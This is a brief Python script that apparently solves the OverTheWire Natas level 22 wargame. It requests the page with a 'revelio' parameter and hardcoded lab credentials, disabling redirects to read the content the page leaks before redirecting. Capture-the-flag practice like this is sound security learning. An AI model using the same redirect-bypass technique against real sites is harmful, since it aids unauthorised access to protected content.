import requests

url = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
auth = ('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')  

# Just hit it and stop redirecting
r = requests.get(url, auth=auth, allow_redirects=False)

print(r.status_code)
print(r.headers.get('Location'))
print(r.text)
